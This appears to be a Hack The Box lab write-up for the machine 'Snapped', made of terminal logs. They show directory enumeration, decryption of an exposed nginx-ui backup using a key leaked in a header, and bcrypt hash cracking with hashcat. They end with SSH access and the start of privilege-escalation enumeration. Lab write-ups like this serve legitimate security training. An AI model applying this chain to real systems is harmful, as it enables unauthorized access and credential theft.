
<img width="1595" height="326" alt="image" src="https://github.com/user-attachments/assets/6a23c604-7a58-4ea0-8d3a-1027374ed668" />




<img width="1297" height="746" alt="image" src="https://github.com/user-attachments/assets/300daa29-4327-4993-a2a4-7b24fb45e511" />




<img width="1913" height="747" alt="image" src="https://github.com/user-attachments/assets/a133bc80-76ff-4781-8e67-335e33749043" />


<img width="1737" height="668" alt="image" src="https://github.com/user-attachments/assets/e26d4121-e7dc-4b61-87ce-27b930a73b52" />



<img width="1919" height="689" alt="image" src="https://github.com/user-attachments/assets/3ec9c982-938b-445a-b444-6bb7eacb8415" />



```
feroxbuster -u http://admin.snapped.htb/
    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://admin.snapped.htb/
 🚩  In-Scope Url          │ admin.snapped.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/feroxbuster/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w       23c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        6l       17w     1344c http://admin.snapped.htb/favicon-32x32.png
200      GET       30l      282w    11373c http://admin.snapped.htb/pwa-192x192.png
301      GET        0l        0w        0c http://admin.snapped.htb/assets => assets/
200      GET       63l      116w     1316c http://admin.snapped.htb/manifest.json
200      GET        9l       12w      243c http://admin.snapped.htb/browserconfig.xml
200      GET       64l      142w    75487c http://admin.snapped.htb/favicon.ico
404      GET      212l      423w    12987c http://admin.snapped.htb/assets/
200      GET      106l      588w    50147c http://admin.snapped.htb/pwa-512x512.png
403      GET        1l        2w       34c http://admin.snapped.htb/mcp
200      GET        1l     8254w   308866c http://admin.snapped.htb/assets/index-Cjd4fVAL.css
200      GET      132l     8887w  2050223c http://admin.snapped.htb/assets/index-DoHxQupa.js
200      GET       50l      104w     1407c http://admin.snapped.htb/
[####################] - 2m     60012/60012   0s      found:12      errors:0      
[####################] - 2m     30000/30000   239/s   http://admin.snapped.htb/ 
[####################] - 2m     30000/30000   242/s   http://admin.snapped.htb/assets/                                                                                                                                                                                                                                    
```







```
feroxbuster -u http://admin.snapped.htb/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://admin.snapped.htb/
 🚩  In-Scope Url          │ admin.snapped.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/feroxbuster/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w       23c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       30l      282w    11373c http://admin.snapped.htb/pwa-192x192.png
200      GET       63l      116w     1316c http://admin.snapped.htb/manifest.json
200      GET        6l       17w     1344c http://admin.snapped.htb/favicon-32x32.png
301      GET        0l        0w        0c http://admin.snapped.htb/assets => assets/
404      GET      212l      423w    12987c http://admin.snapped.htb/assets/
200      GET       64l      142w    75487c http://admin.snapped.htb/favicon.ico
200      GET      106l      588w    50147c http://admin.snapped.htb/pwa-512x512.png
200      GET        9l       12w      243c http://admin.snapped.htb/browserconfig.xml
200      GET        1l     8254w   308866c http://admin.snapped.htb/assets/index-Cjd4fVAL.css
403      GET        1l        2w       34c http://admin.snapped.htb/mcp
200      GET      164l     9945w  2050223c http://admin.snapped.htb/assets/index-DoHxQupa.js
200      GET       50l      104w     1407c http://admin.snapped.htb/
[####################] - 2m     60012/60012   0s      found:12      errors:0      
[####################] - 2m     30000/30000   245/s   http://admin.snapped.htb/ 
[####################] - 2m     30000/30000   247/s   http://admin.snapped.htb/assets/                                                                      
```

```
feroxbuster -u http://admin.snapped.htb/api
                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://admin.snapped.htb/api
 🚩  In-Scope Url          │ admin.snapped.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/feroxbuster/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w       23c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        1l        2w       34c http://admin.snapped.htb/api/node
403      GET        1l        2w       34c http://admin.snapped.htb/api/user
200      GET        1l        1w       29c http://admin.snapped.htb/api/install
403      GET        1l        2w       34c http://admin.snapped.htb/api/sites
403      GET        1l        2w       34c http://admin.snapped.htb/api/config
403      GET        1l        2w       34c http://admin.snapped.htb/api/users
200      GET       66l      421w    33009c http://admin.snapped.htb/api/backup
403      GET        1l        2w       34c http://admin.snapped.htb/api/events
403      GET        1l        2w       34c http://admin.snapped.htb/api/settings
403      GET        1l        2w       34c http://admin.snapped.htb/api/configs
403      GET        1l        2w       34c http://admin.snapped.htb/api/certs
403      GET        1l        2w       34c http://admin.snapped.htb/api/notifications
403      GET        1l        2w       34c http://admin.snapped.htb/api/streams
200      GET        1l        9w    52782c http://admin.snapped.htb/api/licenses
403      GET        1l        2w       34c http://admin.snapped.htb/api/analytic
403      GET        1l        2w       34c http://admin.snapped.htb/api/nodes
[####################] - 2m     30003/30003   0s      found:16      errors:0      
[####################] - 2m     30000/30000   236/s   http://admin.snapped.htb/api/                                                                                                                            
```

```
(root㉿kali)-[/home/kali/Desktop/HTB/backup]
└─# nano nginx.py  
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/backup]
└─# python3 -m venv venv
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/backup]
└─# source venv/bin/activate
                                                                                                                                                             
┌──(venv)─(root㉿kali)-[/home/kali/Desktop/HTB/backup]
└─# pip install pycryptodome
Collecting pycryptodome
  Using cached pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Using cached pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
Installing collected packages: pycryptodome
Successfully installed pycryptodome-3.23.0
                                                                                                                                                             
┌──(venv)─(root㉿kali)-[/home/kali/Desktop/HTB/backup]
└─# python3 nginx.py --target http://admin.snapped.htb --out backup.bin --decrypt

X-Backup-Security: HAI7EiZsL8NIDn2KzcfCgGpK1JnB6NdNSh1q97dptYY=:OrS+A/z4nOFmzWnHmuGFvg==
Parsed AES-256 key: HAI7EiZsL8NIDn2KzcfCgGpK1JnB6NdNSh1q97dptYY=
Parsed AES IV    : OrS+A/z4nOFmzWnHmuGFvg==

[*] Key length: 32 bytes (AES-256 ✓)
[*] IV length : 16 bytes (AES block size ✓)

[*] Extracting encrypted backup to backup_extracted
[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
[*] Decrypting hash_info.txt...
    → Saved to backup_extracted/hash_info.txt.decrypted (199 bytes)
[*] Decrypting nginx-ui.zip...
    → Saved to backup_extracted/nginx-ui_decrypted.zip (7732 bytes)
    → Extracted 2 files to backup_extracted/nginx-ui
[*] Decrypting nginx.zip...
    → Saved to backup_extracted/nginx_decrypted.zip (9936 bytes)
    → Extracted 22 files to backup_extracted/nginx

[*] Hash info:
nginx-ui_hash: cff5533d28879f090b57d26b1edae0404546b0cf3681a16270620dccc887c909
nginx_hash: bcfa98c06e42a4b81636ec16b054cc3fdeeb2bf8e9c8faf1aa1bea03bdd4cd99
timestamp: 20260801-104341
version: 2.3.2

                                                                                                                                                             
┌──(venv)─(root㉿kali)-[/home/kali/Desktop/HTB/backup]
└─# ls
backup.bin  backup_extracted  hash_info.txt  nginx.py  nginx-ui.zip  nginx.zip  venv
                                                                                                                                                             
┌──(venv)─(root㉿kali)-[/home/kali/Desktop/HTB/backup]
└─# cd backup_extracted 
                                                                                                                                                             
┌──(venv)─(root㉿kali)-[/home/…/Desktop/HTB/backup/backup_extracted]
└─# ls
hash_info.txt  hash_info.txt.decrypted  nginx  nginx_decrypted.zip  nginx-ui  nginx-ui_decrypted.zip  nginx-ui.zip  nginx.zip
                                                                                                                                                             
┌──(venv)─(root㉿kali)-[/home/…/Desktop/HTB/backup/backup_extracted]
└─# cd nginx-ui        
                                                                                                                                                             
┌──(venv)─(root㉿kali)-[/home/…/HTB/backup/backup_extracted/nginx-ui]
└─# ls
app.ini  database.db
                                                                                                                                                             
┌──(venv)─(root㉿kali)-[/home/…/HTB/backup/backup_extracted/nginx-ui]
└─# sqlite3 database.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
acme_users         configs            namespaces         sites            
auth_tokens        dns_credentials    nginx_log_indices  streams          
auto_backups       dns_domains        nodes              upstream_configs 
ban_ips            external_notifies  notifications      users            
certs              llm_sessions       passkeys         
config_backups     migrations         site_configs     
sqlite> SELECT * FROM users;
1|2026-03-19 08:22:54.41011219-04:00|2026-03-19 08:39:11.562741743-04:00||admin|$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm|1||g�

|�7�ĝ�*�:���(��\�D�O�}u#,�|en
2|2026-03-19 09:54:01.989628406-04:00|2026-03-19 09:54:01.989628406-04:00||jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq|1||,��զ�H�։��e)5U��Z��▒KĦ"D���W▒|en
sqlite> 

```

```
(root㉿kali)-[/home/kali/Desktop/HTB]
└─# nano nginx.txt
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# hashcat -m 3200 nginx.txt -w /usr/share/wordlists/rockyou.txt
The specified parameter cannot use '/usr/share/wordlists/rockyou.txt' as a value - must be a number.

                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# hashcat -m 3200 nginx.txt  /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i5-1335U, 2463/4926 MB (1024 MB allocatable), 7MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (3824 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2...oCSyWq
Time.Started.....: Sat Aug  1 10:45:20 2026 (6 secs)
Time.Estimated...: Sat Aug  1 10:45:26 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       98 H/s (14.10ms) @ Accel:7 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 539/14344385 (0.00%)
Rejected.........: 0/539 (0.00%)
Restore.Point....: 490/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#01...: hahaha -> lucky1
Hardware.Mon.#01.: Util: 70%

Started: Sat Aug  1 10:45:15 2026
Stopped: Sat Aug  1 10:45:27 2026

┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# 

```

user :jonathan
password:linkinpark

<img width="1897" height="438" alt="image" src="https://github.com/user-attachments/assets/3946fd94-ab7b-4a0c-a335-e6e4645efccc" />


<img width="1080" height="765" alt="image" src="https://github.com/user-attachments/assets/3cab9d89-da61-4c01-b127-bee5d8a18fc0" />


```
ssh jonathan@10.129.2.143                                                                   
The authenticity of host '10.129.2.143 (10.129.2.143)' can't be established.
ED25519 key fingerprint is: SHA256:n0XlQQqHGczclhalpCeoOZDYQGr7rl3WlJytHLWPkr8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.2.143' (ED25519) to the list of known hosts.
jonathan@10.129.2.143's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-19-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Fri Mar 20 12:27:50 2026 from 10.10.14.5
jonathan@snapped:~$ pwd
/home/jonathan
jonathan@snapped:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  user.txt  Videos
jonathan@snapped:~$ cat user.txt
66f063b586cdd038b27b78a6b5bfc32e

```


<img width="1207" height="609" alt="image" src="https://github.com/user-attachments/assets/106d3b2e-a30f-4ae7-929b-89157c5327ef" />



```
jonathan@snapped:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3  23436 14392 ?        Ss   09:41   0:02 /sbin/init splash
root           2  0.0  0.0      0     0 ?        S    09:41   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        S    09:41   0:00 [pool_workqueue_release]
root           4  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-rcu_gp]
root           5  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-sync_wq]
root           6  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-kvfree_rcu_reclaim]
root           7  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-slub_flushwq]
root           8  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-netns]
root           9  0.0  0.0      0     0 ?        I    09:41   0:00 [kworker/0:0-events]
root          11  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/0:0H-events_highpri]
root          13  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-mm_percpu_wq]
root          14  0.0  0.0      0     0 ?        S    09:41   0:00 [ksoftirqd/0]
root          15  0.0  0.0      0     0 ?        I    09:41   0:01 [rcu_preempt]
root          16  0.0  0.0      0     0 ?        S    09:41   0:00 [rcu_exp_par_gp_kthread_worker/0]
root          17  0.0  0.0      0     0 ?        S    09:41   0:00 [rcu_exp_gp_kthread_worker]
root          18  0.0  0.0      0     0 ?        S    09:41   0:00 [migration/0]
root          19  0.0  0.0      0     0 ?        S    09:41   0:00 [idle_inject/0]
root          20  0.0  0.0      0     0 ?        S    09:41   0:00 [cpuhp/0]
root          21  0.0  0.0      0     0 ?        S    09:41   0:00 [cpuhp/1]
root          22  0.0  0.0      0     0 ?        S    09:41   0:00 [idle_inject/1]
root          23  0.0  0.0      0     0 ?        S    09:41   0:00 [migration/1]
root          24  0.0  0.0      0     0 ?        S    09:41   0:00 [ksoftirqd/1]
root          26  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/1:0H-events_highpri]
root          27  0.0  0.0      0     0 ?        S    09:41   0:00 [kdevtmpfs]
root          28  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-inet_frag_wq]
root          29  0.0  0.0      0     0 ?        I    09:41   0:00 [rcu_tasks_kthread]
root          30  0.0  0.0      0     0 ?        I    09:41   0:00 [rcu_tasks_rude_kthread]
root          31  0.0  0.0      0     0 ?        I    09:41   0:00 [rcu_tasks_trace_kthread]
root          32  0.0  0.0      0     0 ?        S    09:41   0:00 [kauditd]
root          33  0.0  0.0      0     0 ?        S    09:41   0:00 [khungtaskd]
root          35  0.0  0.0      0     0 ?        S    09:41   0:00 [oom_reaper]
root          36  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-writeback]
root          38  0.0  0.0      0     0 ?        S    09:41   0:00 [kcompactd0]
root          39  0.0  0.0      0     0 ?        SN   09:41   0:00 [ksmd]
root          40  0.0  0.0      0     0 ?        SN   09:41   0:00 [khugepaged]
root          41  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-kblockd]
root          42  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-blkcg_punt_bio]
root          43  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-kintegrityd]
root          44  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/9-acpi]
root          46  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-tpm_dev_wq]
root          47  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-ata_sff]
root          48  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-md]
root          49  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-md_bitmap]
root          50  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-edac-poller]
root          51  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-devfreq_wq]
root          52  0.0  0.0      0     0 ?        S    09:41   0:00 [watchdogd]
root          53  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-quota_events_unbound]
root          54  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/0:1H-kblockd]
root          55  0.0  0.0      0     0 ?        S    09:41   0:00 [kswapd0]
root          56  0.0  0.0      0     0 ?        S    09:41   0:00 [ecryptfs-kthread]
root          57  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-kthrotld]
root          58  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/24-pciehp]
root          59  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/25-pciehp]
root          60  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/26-pciehp]
root          61  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/27-pciehp]
root          62  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/28-pciehp]
root          63  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/29-pciehp]
root          64  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/30-pciehp]
root          65  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/31-pciehp]
root          66  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/32-pciehp]
root          67  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/33-pciehp]
root          68  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/34-pciehp]
root          69  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/35-pciehp]
root          70  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/36-pciehp]
root          71  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/37-pciehp]
root          72  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/38-pciehp]
root          73  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/39-pciehp]
root          74  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/40-pciehp]
root          75  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/41-pciehp]
root          76  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/42-pciehp]
root          77  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/43-pciehp]
root          78  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/44-pciehp]
root          79  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/45-pciehp]
root          80  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/46-pciehp]
root          81  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/47-pciehp]
root          82  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/48-pciehp]
root          83  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/49-pciehp]
root          84  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/50-pciehp]
root          85  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/51-pciehp]
root          86  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/52-pciehp]
root          87  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/53-pciehp]
root          88  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/54-pciehp]
root          89  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/55-pciehp]
root          90  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-acpi_thermal_pm]
root          91  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_0]
root          92  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_0]
root          93  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_1]
root          94  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_1]
root          96  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-mld]
root          98  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/1:1H-kblockd]
root          99  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-ipv6_addrconf]
root         100  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-kstrp]
root         102  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/u9:0-ttm]
root         114  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-charger_manager]
root         171  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_2]
root         173  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_2]
root         174  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-vmw_pvscsi_wq_2]
root         193  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_3]
root         194  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_3]
root         195  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_4]
root         196  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_4]
root         197  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_5]
root         198  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_5]
root         199  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_6]
root         200  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_6]
root         201  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_7]
root         202  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_7]
root         203  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_8]
root         204  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_8]
root         205  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_9]
root         206  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_9]
root         207  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_10]
root         208  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_10]
root         209  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_11]
root         210  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_11]
root         211  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_12]
root         212  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_12]
root         213  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_13]
root         214  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_13]
root         215  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_14]
root         216  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_14]
root         217  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_15]
root         218  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_15]
root         219  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_16]
root         220  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_16]
root         221  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_17]
root         222  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_17]
root         223  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_18]
root         224  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_18]
root         225  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_19]
root         226  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_19]
root         227  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_20]
root         228  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_20]
root         229  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_21]
root         230  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_21]
root         231  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_22]
root         232  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_22]
root         233  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_23]
root         234  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_23]
root         235  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_24]
root         236  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_24]
root         237  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_25]
root         238  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_25]
root         239  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_26]
root         240  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_26]
root         241  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_27]
root         242  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_27]
root         243  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_28]
root         244  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_28]
root         245  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_29]
root         246  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_29]
root         247  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_30]
root         248  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_30]
root         249  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_31]
root         250  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_31]
root         251  0.0  0.0      0     0 ?        S    09:41   0:00 [scsi_eh_32]
root         252  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-scsi_tmf_32]
root         276  0.0  0.0      0     0 ?        I    09:41   0:00 [kworker/u8:28-flush-252:0]
root         282  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-kdmflush/252:0]
root         321  0.0  0.0      0     0 ?        S    09:41   0:00 [jbd2/dm-0-8]
root         322  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-ext4-rsv-conversion]
root         374  0.2  0.4  50748 16116 ?        S<s  09:41   0:10 /usr/lib/systemd/systemd-journald
root         408  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/16-vmwgfx]
root         409  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-ttm]
root         411  0.0  0.0 152484  1608 ?        Ssl  09:41   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,all
root         450  0.0  0.2  30956  8988 ?        Ss   09:41   0:00 /usr/lib/systemd/systemd-udevd
root         468  0.0  0.0      0     0 ?        S    09:41   0:00 [psimon]
